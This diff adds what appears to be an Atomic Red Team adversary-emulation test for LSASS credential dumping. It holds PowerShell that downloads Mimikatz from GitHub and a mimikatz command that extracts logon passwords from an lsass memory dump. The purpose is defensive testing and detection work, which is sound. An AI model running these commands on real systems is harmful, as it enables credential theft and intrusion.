@@ -1,0 +1,23 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: Offline Credential Theft With Mimikatz
+#Description: The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with&Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.&
+#Language: cmd
+
+#get_prereq_commands
+$url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
+$request = [System.Net.WebRequest]::Create($url)
+$response = $request.GetResponse()
+$realTagUrl = $response.ResponseUri.OriginalString
+$version = $realTagUrl.split('/')[-1]
+$fileName = 'mimikatz_trunk.zip'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
+Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.001\bin\mimikatz.exe) -Force | Out-Null
+Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe PathToAtomicsFolder\T1003.001\bin\mimikatz.exe -Force
+
+
+#commands
+PathToAtomicsFolder\T1003.001\bin\mimikatz.exe "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit
+
